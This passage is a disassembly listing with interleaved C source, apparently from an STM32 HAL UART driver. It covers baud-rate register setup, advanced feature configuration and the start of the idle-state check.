 8005a04:	f7fe fdec 	bl	80045e0 <HAL_RCC_GetPCLK1Freq>
 8005a08:	61f8      	str	r0, [r7, #28]
        break;
 8005a0a:	e020      	b.n	8005a4e <UART_SetConfig+0x342>
 8005a0c:	efff69f3 	.word	0xefff69f3
 8005a10:	40008000 	.word	0x40008000
 8005a14:	40013800 	.word	0x40013800
 8005a18:	40021000 	.word	0x40021000
 8005a1c:	40004400 	.word	0x40004400
 8005a20:	00f42400 	.word	0x00f42400
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 8005a24:	f7fe fdf2 	bl	800460c <HAL_RCC_GetPCLK2Freq>
 8005a28:	61f8      	str	r0, [r7, #28]
        break;
 8005a2a:	e010      	b.n	8005a4e <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005a2c:	4b4c      	ldr	r3, [pc, #304]	; (8005b60 <UART_SetConfig+0x454>)
 8005a2e:	61fb      	str	r3, [r7, #28]
        break;
 8005a30:	e00d      	b.n	8005a4e <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 8005a32:	f7fe fd3d 	bl	80044b0 <HAL_RCC_GetSysClockFreq>
 8005a36:	61f8      	str	r0, [r7, #28]
        break;
 8005a38:	e009      	b.n	8005a4e <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 8005a3a:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8005a3e:	61fb      	str	r3, [r7, #28]
        break;
 8005a40:	e005      	b.n	8005a4e <UART_SetConfig+0x342>
      default:
        pclk = 0U;
 8005a42:	2300      	movs	r3, #0
 8005a44:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 8005a46:	2301      	movs	r3, #1
 8005a48:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005a4c:	bf00      	nop
    }

    /* USARTDIV must be greater than or equal to 0d16 */
    if (pclk != 0U)
 8005a4e:	69fb      	ldr	r3, [r7, #28]
 8005a50:	2b00      	cmp	r3, #0
 8005a52:	d077      	beq.n	8005b44 <UART_SetConfig+0x438>
    {
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate));
 8005a54:	69fb      	ldr	r3, [r7, #28]
 8005a56:	005a      	lsls	r2, r3, #1
 8005a58:	68fb      	ldr	r3, [r7, #12]
 8005a5a:	685b      	ldr	r3, [r3, #4]
 8005a5c:	085b      	lsrs	r3, r3, #1
 8005a5e:	441a      	add	r2, r3
 8005a60:	68fb      	ldr	r3, [r7, #12]
 8005a62:	685b      	ldr	r3, [r3, #4]
 8005a64:	fbb2 f3f3 	udiv	r3, r2, r3
 8005a68:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 8005a6a:	69bb      	ldr	r3, [r7, #24]
 8005a6c:	2b0f      	cmp	r3, #15
 8005a6e:	d916      	bls.n	8005a9e <UART_SetConfig+0x392>
 8005a70:	69bb      	ldr	r3, [r7, #24]
 8005a72:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8005a76:	d212      	bcs.n	8005a9e <UART_SetConfig+0x392>
      {
        brrtemp = (uint16_t)(usartdiv & 0xFFF0U);
 8005a78:	69bb      	ldr	r3, [r7, #24]
 8005a7a:	b29b      	uxth	r3, r3
 8005a7c:	f023 030f 	bic.w	r3, r3, #15
 8005a80:	82fb      	strh	r3, [r7, #22]
        brrtemp |= (uint16_t)((usartdiv & (uint16_t)0x000FU) >> 1U);
 8005a82:	69bb      	ldr	r3, [r7, #24]
 8005a84:	085b      	lsrs	r3, r3, #1
 8005a86:	b29b      	uxth	r3, r3
 8005a88:	f003 0307 	and.w	r3, r3, #7
 8005a8c:	b29a      	uxth	r2, r3
 8005a8e:	8afb      	ldrh	r3, [r7, #22]
 8005a90:	4313      	orrs	r3, r2
 8005a92:	82fb      	strh	r3, [r7, #22]
        huart->Instance->BRR = brrtemp;
 8005a94:	68fb      	ldr	r3, [r7, #12]
 8005a96:	681b      	ldr	r3, [r3, #0]
 8005a98:	8afa      	ldrh	r2, [r7, #22]
 8005a9a:	60da      	str	r2, [r3, #12]
 8005a9c:	e052      	b.n	8005b44 <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 8005a9e:	2301      	movs	r3, #1
 8005aa0:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 8005aa4:	e04e      	b.n	8005b44 <UART_SetConfig+0x438>
      }
    }
  }
  else
  {
    switch (clocksource)
 8005aa6:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 8005aaa:	2b08      	cmp	r3, #8
 8005aac:	d827      	bhi.n	8005afe <UART_SetConfig+0x3f2>
 8005aae:	a201      	add	r2, pc, #4	; (adr r2, 8005ab4 <UART_SetConfig+0x3a8>)
 8005ab0:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005ab4:	08005ad9 	.word	0x08005ad9
 8005ab8:	08005ae1 	.word	0x08005ae1
 8005abc:	08005ae9 	.word	0x08005ae9
 8005ac0:	08005aff 	.word	0x08005aff
 8005ac4:	08005aef 	.word	0x08005aef
 8005ac8:	08005aff 	.word	0x08005aff
 8005acc:	08005aff 	.word	0x08005aff
 8005ad0:	08005aff 	.word	0x08005aff
 8005ad4:	08005af7 	.word	0x08005af7
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 8005ad8:	f7fe fd82 	bl	80045e0 <HAL_RCC_GetPCLK1Freq>
 8005adc:	61f8      	str	r0, [r7, #28]
        break;
 8005ade:	e014      	b.n	8005b0a <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 8005ae0:	f7fe fd94 	bl	800460c <HAL_RCC_GetPCLK2Freq>
 8005ae4:	61f8      	str	r0, [r7, #28]
        break;
 8005ae6:	e010      	b.n	8005b0a <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005ae8:	4b1d      	ldr	r3, [pc, #116]	; (8005b60 <UART_SetConfig+0x454>)
 8005aea:	61fb      	str	r3, [r7, #28]
        break;
 8005aec:	e00d      	b.n	8005b0a <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 8005aee:	f7fe fcdf 	bl	80044b0 <HAL_RCC_GetSysClockFreq>
 8005af2:	61f8      	str	r0, [r7, #28]
        break;
 8005af4:	e009      	b.n	8005b0a <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 8005af6:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8005afa:	61fb      	str	r3, [r7, #28]
        break;
 8005afc:	e005      	b.n	8005b0a <UART_SetConfig+0x3fe>
      default:
        pclk = 0U;
 8005afe:	2300      	movs	r3, #0
 8005b00:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 8005b02:	2301      	movs	r3, #1
 8005b04:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005b08:	bf00      	nop
    }

    if (pclk != 0U)
 8005b0a:	69fb      	ldr	r3, [r7, #28]
 8005b0c:	2b00      	cmp	r3, #0
 8005b0e:	d019      	beq.n	8005b44 <UART_SetConfig+0x438>
    {
      /* USARTDIV must be greater than or equal to 0d16 */
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate));
 8005b10:	68fb      	ldr	r3, [r7, #12]
 8005b12:	685b      	ldr	r3, [r3, #4]
 8005b14:	085a      	lsrs	r2, r3, #1
 8005b16:	69fb      	ldr	r3, [r7, #28]
 8005b18:	441a      	add	r2, r3
 8005b1a:	68fb      	ldr	r3, [r7, #12]
 8005b1c:	685b      	ldr	r3, [r3, #4]
 8005b1e:	fbb2 f3f3 	udiv	r3, r2, r3
 8005b22:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 8005b24:	69bb      	ldr	r3, [r7, #24]
 8005b26:	2b0f      	cmp	r3, #15
 8005b28:	d909      	bls.n	8005b3e <UART_SetConfig+0x432>
 8005b2a:	69bb      	ldr	r3, [r7, #24]
 8005b2c:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8005b30:	d205      	bcs.n	8005b3e <UART_SetConfig+0x432>
      {
        huart->Instance->BRR = (uint16_t)usartdiv;
 8005b32:	69bb      	ldr	r3, [r7, #24]
 8005b34:	b29a      	uxth	r2, r3
 8005b36:	68fb      	ldr	r3, [r7, #12]
 8005b38:	681b      	ldr	r3, [r3, #0]
 8005b3a:	60da      	str	r2, [r3, #12]
 8005b3c:	e002      	b.n	8005b44 <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 8005b3e:	2301      	movs	r3, #1
 8005b40:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  huart->NbTxDataToProcess = 1;
  huart->NbRxDataToProcess = 1;
#endif /* USART_CR1_FIFOEN */

  /* Clear ISR function pointers */
  huart->RxISR = NULL;
 8005b44:	68fb      	ldr	r3, [r7, #12]
 8005b46:	2200      	movs	r2, #0
 8005b48:	669a      	str	r2, [r3, #104]	; 0x68
  huart->TxISR = NULL;
 8005b4a:	68fb      	ldr	r3, [r7, #12]
 8005b4c:	2200      	movs	r2, #0
 8005b4e:	66da      	str	r2, [r3, #108]	; 0x6c

  return ret;
 8005b50:	f897 3022 	ldrb.w	r3, [r7, #34]	; 0x22
}
 8005b54:	4618      	mov	r0, r3
 8005b56:	3728      	adds	r7, #40	; 0x28
 8005b58:	46bd      	mov	sp, r7
 8005b5a:	e8bd 8fb0 	ldmia.w	sp!, {r4, r5, r7, r8, r9, sl, fp, pc}
 8005b5e:	bf00      	nop
 8005b60:	00f42400 	.word	0x00f42400

08005b64 <UART_AdvFeatureConfig>:
  * @brief Configure the UART peripheral advanced features.
  * @param huart UART handle.
  * @retval None
  */
void UART_AdvFeatureConfig(UART_HandleTypeDef *huart)
{
 8005b64:	b480      	push	{r7}
 8005b66:	b083      	sub	sp, #12
 8005b68:	af00      	add	r7, sp, #0
 8005b6a:	6078      	str	r0, [r7, #4]
  /* Check whether the set of advanced features to configure is properly set */
  assert_param(IS_UART_ADVFEATURE_INIT(huart->AdvancedInit.AdvFeatureInit));

  /* if required, configure RX/TX pins swap */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_SWAP_INIT))
 8005b6c:	687b      	ldr	r3, [r7, #4]
 8005b6e:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005b70:	f003 0308 	and.w	r3, r3, #8
 8005b74:	2b00      	cmp	r3, #0
 8005b76:	d00a      	beq.n	8005b8e <UART_AdvFeatureConfig+0x2a>
  {
    assert_param(IS_UART_ADVFEATURE_SWAP(huart->AdvancedInit.Swap));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_SWAP, huart->AdvancedInit.Swap);
 8005b78:	687b      	ldr	r3, [r7, #4]
 8005b7a:	681b      	ldr	r3, [r3, #0]
 8005b7c:	685b      	ldr	r3, [r3, #4]
 8005b7e:	f423 4100 	bic.w	r1, r3, #32768	; 0x8000
 8005b82:	687b      	ldr	r3, [r7, #4]
 8005b84:	6b5a      	ldr	r2, [r3, #52]	; 0x34
 8005b86:	687b      	ldr	r3, [r7, #4]
 8005b88:	681b      	ldr	r3, [r3, #0]
 8005b8a:	430a      	orrs	r2, r1
 8005b8c:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure TX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_TXINVERT_INIT))
 8005b8e:	687b      	ldr	r3, [r7, #4]
 8005b90:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005b92:	f003 0301 	and.w	r3, r3, #1
 8005b96:	2b00      	cmp	r3, #0
 8005b98:	d00a      	beq.n	8005bb0 <UART_AdvFeatureConfig+0x4c>
  {
    assert_param(IS_UART_ADVFEATURE_TXINV(huart->AdvancedInit.TxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_TXINV, huart->AdvancedInit.TxPinLevelInvert);
 8005b9a:	687b      	ldr	r3, [r7, #4]
 8005b9c:	681b      	ldr	r3, [r3, #0]
 8005b9e:	685b      	ldr	r3, [r3, #4]
 8005ba0:	f423 3100 	bic.w	r1, r3, #131072	; 0x20000
 8005ba4:	687b      	ldr	r3, [r7, #4]
 8005ba6:	6a9a      	ldr	r2, [r3, #40]	; 0x28
 8005ba8:	687b      	ldr	r3, [r7, #4]
 8005baa:	681b      	ldr	r3, [r3, #0]
 8005bac:	430a      	orrs	r2, r1
 8005bae:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXINVERT_INIT))
 8005bb0:	687b      	ldr	r3, [r7, #4]
 8005bb2:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005bb4:	f003 0302 	and.w	r3, r3, #2
 8005bb8:	2b00      	cmp	r3, #0
 8005bba:	d00a      	beq.n	8005bd2 <UART_AdvFeatureConfig+0x6e>
  {
    assert_param(IS_UART_ADVFEATURE_RXINV(huart->AdvancedInit.RxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_RXINV, huart->AdvancedInit.RxPinLevelInvert);
 8005bbc:	687b      	ldr	r3, [r7, #4]
 8005bbe:	681b      	ldr	r3, [r3, #0]
 8005bc0:	685b      	ldr	r3, [r3, #4]
 8005bc2:	f423 3180 	bic.w	r1, r3, #65536	; 0x10000
 8005bc6:	687b      	ldr	r3, [r7, #4]
 8005bc8:	6ada      	ldr	r2, [r3, #44]	; 0x2c
 8005bca:	687b      	ldr	r3, [r7, #4]
 8005bcc:	681b      	ldr	r3, [r3, #0]
 8005bce:	430a      	orrs	r2, r1
 8005bd0:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure data inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DATAINVERT_INIT))
 8005bd2:	687b      	ldr	r3, [r7, #4]
 8005bd4:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005bd6:	f003 0304 	and.w	r3, r3, #4
 8005bda:	2b00      	cmp	r3, #0
 8005bdc:	d00a      	beq.n	8005bf4 <UART_AdvFeatureConfig+0x90>
  {
    assert_param(IS_UART_ADVFEATURE_DATAINV(huart->AdvancedInit.DataInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_DATAINV, huart->AdvancedInit.DataInvert);
 8005bde:	687b      	ldr	r3, [r7, #4]
 8005be0:	681b      	ldr	r3, [r3, #0]
 8005be2:	685b      	ldr	r3, [r3, #4]
 8005be4:	f423 2180 	bic.w	r1, r3, #262144	; 0x40000
 8005be8:	687b      	ldr	r3, [r7, #4]
 8005bea:	6b1a      	ldr	r2, [r3, #48]	; 0x30
 8005bec:	687b      	ldr	r3, [r7, #4]
 8005bee:	681b      	ldr	r3, [r3, #0]
 8005bf0:	430a      	orrs	r2, r1
 8005bf2:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX overrun detection disabling */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXOVERRUNDISABLE_INIT))
 8005bf4:	687b      	ldr	r3, [r7, #4]
 8005bf6:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005bf8:	f003 0310 	and.w	r3, r3, #16
 8005bfc:	2b00      	cmp	r3, #0
 8005bfe:	d00a      	beq.n	8005c16 <UART_AdvFeatureConfig+0xb2>
  {
    assert_param(IS_UART_OVERRUN(huart->AdvancedInit.OverrunDisable));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_OVRDIS, huart->AdvancedInit.OverrunDisable);
 8005c00:	687b      	ldr	r3, [r7, #4]
 8005c02:	681b      	ldr	r3, [r3, #0]
 8005c04:	689b      	ldr	r3, [r3, #8]
 8005c06:	f423 5180 	bic.w	r1, r3, #4096	; 0x1000
 8005c0a:	687b      	ldr	r3, [r7, #4]
 8005c0c:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 8005c0e:	687b      	ldr	r3, [r7, #4]
 8005c10:	681b      	ldr	r3, [r3, #0]
 8005c12:	430a      	orrs	r2, r1
 8005c14:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure DMA disabling on reception error */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DMADISABLEONERROR_INIT))
 8005c16:	687b      	ldr	r3, [r7, #4]
 8005c18:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005c1a:	f003 0320 	and.w	r3, r3, #32
 8005c1e:	2b00      	cmp	r3, #0
 8005c20:	d00a      	beq.n	8005c38 <UART_AdvFeatureConfig+0xd4>
  {
    assert_param(IS_UART_ADVFEATURE_DMAONRXERROR(huart->AdvancedInit.DMADisableonRxError));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_DDRE, huart->AdvancedInit.DMADisableonRxError);
 8005c22:	687b      	ldr	r3, [r7, #4]
 8005c24:	681b      	ldr	r3, [r3, #0]
 8005c26:	689b      	ldr	r3, [r3, #8]
 8005c28:	f423 5100 	bic.w	r1, r3, #8192	; 0x2000
 8005c2c:	687b      	ldr	r3, [r7, #4]
 8005c2e:	6bda      	ldr	r2, [r3, #60]	; 0x3c
 8005c30:	687b      	ldr	r3, [r7, #4]
 8005c32:	681b      	ldr	r3, [r3, #0]
 8005c34:	430a      	orrs	r2, r1
 8005c36:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure auto Baud rate detection scheme */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_AUTOBAUDRATE_INIT))
 8005c38:	687b      	ldr	r3, [r7, #4]
 8005c3a:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005c3c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8005c40:	2b00      	cmp	r3, #0
 8005c42:	d01a      	beq.n	8005c7a <UART_AdvFeatureConfig+0x116>
  {
    assert_param(IS_USART_AUTOBAUDRATE_DETECTION_INSTANCE(huart->Instance));
    assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATE(huart->AdvancedInit.AutoBaudRateEnable));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_ABREN, huart->AdvancedInit.AutoBaudRateEnable);
 8005c44:	687b      	ldr	r3, [r7, #4]
 8005c46:	681b      	ldr	r3, [r3, #0]
 8005c48:	685b      	ldr	r3, [r3, #4]
 8005c4a:	f423 1180 	bic.w	r1, r3, #1048576	; 0x100000
 8005c4e:	687b      	ldr	r3, [r7, #4]
 8005c50:	6c1a      	ldr	r2, [r3, #64]	; 0x40
 8005c52:	687b      	ldr	r3, [r7, #4]
 8005c54:	681b      	ldr	r3, [r3, #0]
 8005c56:	430a      	orrs	r2, r1
 8005c58:	605a      	str	r2, [r3, #4]
    /* set auto Baudrate detection parameters if detection is enabled */
    if (huart->AdvancedInit.AutoBaudRateEnable == UART_ADVFEATURE_AUTOBAUDRATE_ENABLE)
 8005c5a:	687b      	ldr	r3, [r7, #4]
 8005c5c:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8005c5e:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 8005c62:	d10a      	bne.n	8005c7a <UART_AdvFeatureConfig+0x116>
    {
      assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATEMODE(huart->AdvancedInit.AutoBaudRateMode));
      MODIFY_REG(huart->Instance->CR2, USART_CR2_ABRMODE, huart->AdvancedInit.AutoBaudRateMode);
 8005c64:	687b      	ldr	r3, [r7, #4]
 8005c66:	681b      	ldr	r3, [r3, #0]
 8005c68:	685b      	ldr	r3, [r3, #4]
 8005c6a:	f423 01c0 	bic.w	r1, r3, #6291456	; 0x600000
 8005c6e:	687b      	ldr	r3, [r7, #4]
 8005c70:	6c5a      	ldr	r2, [r3, #68]	; 0x44
 8005c72:	687b      	ldr	r3, [r7, #4]
 8005c74:	681b      	ldr	r3, [r3, #0]
 8005c76:	430a      	orrs	r2, r1
 8005c78:	605a      	str	r2, [r3, #4]
    }
  }

  /* if required, configure MSB first on communication line */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_MSBFIRST_INIT))
 8005c7a:	687b      	ldr	r3, [r7, #4]
 8005c7c:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005c7e:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8005c82:	2b00      	cmp	r3, #0
 8005c84:	d00a      	beq.n	8005c9c <UART_AdvFeatureConfig+0x138>
  {
    assert_param(IS_UART_ADVFEATURE_MSBFIRST(huart->AdvancedInit.MSBFirst));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_MSBFIRST, huart->AdvancedInit.MSBFirst);
 8005c86:	687b      	ldr	r3, [r7, #4]
 8005c88:	681b      	ldr	r3, [r3, #0]
 8005c8a:	685b      	ldr	r3, [r3, #4]
 8005c8c:	f423 2100 	bic.w	r1, r3, #524288	; 0x80000
 8005c90:	687b      	ldr	r3, [r7, #4]
 8005c92:	6c9a      	ldr	r2, [r3, #72]	; 0x48
 8005c94:	687b      	ldr	r3, [r7, #4]
 8005c96:	681b      	ldr	r3, [r3, #0]
 8005c98:	430a      	orrs	r2, r1
 8005c9a:	605a      	str	r2, [r3, #4]
  }
}
 8005c9c:	bf00      	nop
 8005c9e:	370c      	adds	r7, #12
 8005ca0:	46bd      	mov	sp, r7
 8005ca2:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005ca6:	4770      	bx	lr

08005ca8 <UART_CheckIdleState>:
  * @brief Check the UART Idle State.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_CheckIdleState(UART_HandleTypeDef *huart)
{
 8005ca8:	b580      	push	{r7, lr}
 8005caa:	b098      	sub	sp, #96	; 0x60
 8005cac:	af02      	add	r7, sp, #8
 8005cae:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;

  /* Initialize the UART ErrorCode */
  huart->ErrorCode = HAL_UART_ERROR_NONE;
 8005cb0:	687b      	ldr	r3, [r7, #4]
 8005cb2:	2200      	movs	r2, #0
 8005cb4:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

  /* Init tickstart for timeout management */
  tickstart = HAL_GetTick();
 8005cb8:	f7fb fb62 	bl	8001380 <HAL_GetTick>
 8005cbc:	6578      	str	r0, [r7, #84]	; 0x54

  /* Check if the Transmitter is enabled */
  if ((huart->Instance->CR1 & USART_CR1_TE) == USART_CR1_TE)
 8005cbe:	687b      	ldr	r3, [r7, #4]
 8005cc0:	681b      	ldr	r3, [r3, #0]
 8005cc2:	681b      	ldr	r3, [r3, #0]
 8005cc4:	f003 0308 	and.w	r3, r3, #8
 8005cc8:	2b08      	cmp	r3, #8
 8005cca:	d12e      	bne.n	8005d2a <UART_CheckIdleState+0x82>
  {
    /* Wait until TEACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_TEACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005ccc:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005cd0:	9300      	str	r3, [sp, #0]
 8005cd2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005cd4:	2200      	movs	r2, #0
 8005cd6:	f44f 1100 	mov.w	r1, #2097152	; 0x200000
 8005cda:	6878      	ldr	r0, [r7, #4]
 8005cdc:	f000 f88c 	bl	8005df8 <UART_WaitOnFlagUntilTimeout>
 8005ce0:	4603      	mov	r3, r0
 8005ce2:	2b00      	cmp	r3, #0
 8005ce4:	d021      	beq.n	8005d2a <UART_CheckIdleState+0x82>
    {
      /* Disable TXE interrupt for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE_TXFNFIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE));
 8005ce6:	687b      	ldr	r3, [r7, #4]
 8005ce8:	681b      	ldr	r3, [r3, #0]
 8005cea:	63bb      	str	r3, [r7, #56]	; 0x38
 */
__STATIC_FORCEINLINE uint32_t __LDREXW(volatile uint32_t *addr)
{
    uint32_t result;

   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005cec:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005cee:	e853 3f00 	ldrex	r3, [r3]
 8005cf2:	637b      	str	r3, [r7, #52]	; 0x34
   return(result);
 8005cf4:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005cf6:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 8005cfa:	653b      	str	r3, [r7, #80]	; 0x50
 8005cfc:	687b      	ldr	r3, [r7, #4]
 8005cfe:	681b      	ldr	r3, [r3, #0]
 8005d00:	461a      	mov	r2, r3
 8005d02:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8005d04:	647b      	str	r3, [r7, #68]	; 0x44
 8005d06:	643a      	str	r2, [r7, #64]	; 0x40
 */
__STATIC_FORCEINLINE uint32_t __STREXW(uint32_t value, volatile uint32_t *addr)
{
   uint32_t result;

   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005d08:	6c39      	ldr	r1, [r7, #64]	; 0x40
 8005d0a:	6c7a      	ldr	r2, [r7, #68]	; 0x44
 8005d0c:	e841 2300 	strex	r3, r2, [r1]
 8005d10:	63fb      	str	r3, [r7, #60]	; 0x3c
   return(result);
 8005d12:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8005d14:	2b00      	cmp	r3, #0
 8005d16:	d1e6      	bne.n	8005ce6 <UART_CheckIdleState+0x3e>
#endif /* USART_CR1_FIFOEN */

      huart->gState = HAL_UART_STATE_READY;
 8005d18:	687b      	ldr	r3, [r7, #4]
 8005d1a:	2220      	movs	r2, #32
 8005d1c:	67da      	str	r2, [r3, #124]	; 0x7c

      __HAL_UNLOCK(huart);
 8005d1e:	687b      	ldr	r3, [r7, #4]
 8005d20:	2200      	movs	r2, #0
 8005d22:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005d26:	2303      	movs	r3, #3
 8005d28:	e062      	b.n	8005df0 <UART_CheckIdleState+0x148>
    }
  }

  /* Check if the Receiver is enabled */
  if ((huart->Instance->CR1 & USART_CR1_RE) == USART_CR1_RE)
 8005d2a:	687b      	ldr	r3, [r7, #4]
 8005d2c:	681b      	ldr	r3, [r3, #0]
 8005d2e:	681b      	ldr	r3, [r3, #0]
 8005d30:	f003 0304 	and.w	r3, r3, #4
 8005d34:	2b04      	cmp	r3, #4
 8005d36:	d149      	bne.n	8005dcc <UART_CheckIdleState+0x124>
  {
    /* Wait until REACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_REACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005d38:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005d3c:	9300      	str	r3, [sp, #0]
 8005d3e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005d40:	2200      	movs	r2, #0
 8005d42:	f44f 0180 	mov.w	r1, #4194304	; 0x400000
 8005d46:	6878      	ldr	r0, [r7, #4]
 8005d48:	f000 f856 	bl	8005df8 <UART_WaitOnFlagUntilTimeout>
 8005d4c:	4603      	mov	r3, r0
 8005d4e:	2b00      	cmp	r3, #0
 8005d50:	d03c      	beq.n	8005dcc <UART_CheckIdleState+0x124>
      /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error)
      interrupts for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005d52:	687b      	ldr	r3, [r7, #4]
 8005d54:	681b      	ldr	r3, [r3, #0]
 8005d56:	627b      	str	r3, [r7, #36]	; 0x24
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005d58:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005d5a:	e853 3f00 	ldrex	r3, [r3]
 8005d5e:	623b      	str	r3, [r7, #32]
   return(result);
 8005d60:	6a3b      	ldr	r3, [r7, #32]
 8005d62:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005d66:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005d68:	687b      	ldr	r3, [r7, #4]
 8005d6a:	681b      	ldr	r3, [r3, #0]
 8005d6c:	461a      	mov	r2, r3
 8005d6e:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
